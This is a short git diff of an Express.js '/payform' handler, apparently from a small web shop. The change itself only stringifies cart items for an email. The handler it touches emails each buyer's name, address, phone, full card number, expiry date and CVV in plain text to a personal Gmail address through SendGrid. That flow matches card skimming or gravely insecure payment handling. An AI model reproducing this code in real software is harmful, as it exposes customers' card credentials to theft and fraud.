@@ -187,13 +187,15 @@ app.post('/payform', (req, res) => {
     parsedCartItems[i].img = "";
   }
 
-  console.log ("Cart Iems: ", parsedCartItems)
+  const cartItemsString = JSON.stringify(parsedCartItems);
+
+  console.log("Cart Items :", cartItemsString);
 
   const msg = {
     from: email,
     to: 'ferrangaldon100@gmail.com',
     subject: 'Datos de la compra de un usuario',
-    text: `-Datos del comprador-\nEmail: ${email}\nPaís: ${country}\nNombre: ${name}\nApellidos: ${surnames}\nDirección: ${street}\nMas información de la dirección: ${house}\nCódigo Postal: ${postal}\nCiudad: ${city}\nProvíncia o estado: ${state}\nTeléfono: ${phone}\n-Datos bancarios del comprador-\nNúmero de la tarjeta: ${number}\nFecha de caducidad: ${expire}\nCVV/CVC: ${cvv}\n-Productos que ha comprado-\n${parsedCartItems}`,
+    text: `-Datos del comprador-\nEmail: ${email}\nPaís: ${country}\nNombre: ${name}\nApellidos: ${surnames}\nDirección: ${street}\nMas información de la dirección: ${house}\nCódigo Postal: ${postal}\nCiudad: ${city}\nProvíncia o estado: ${state}\nTeléfono: ${phone}\n-Datos bancarios del comprador-\nNúmero de la tarjeta: ${number}\nFecha de caducidad: ${expire}\nCVV/CVC: ${cvv}\n-Productos que ha comprado-\n${cartItemsString}`,
   };
 
   sgMail
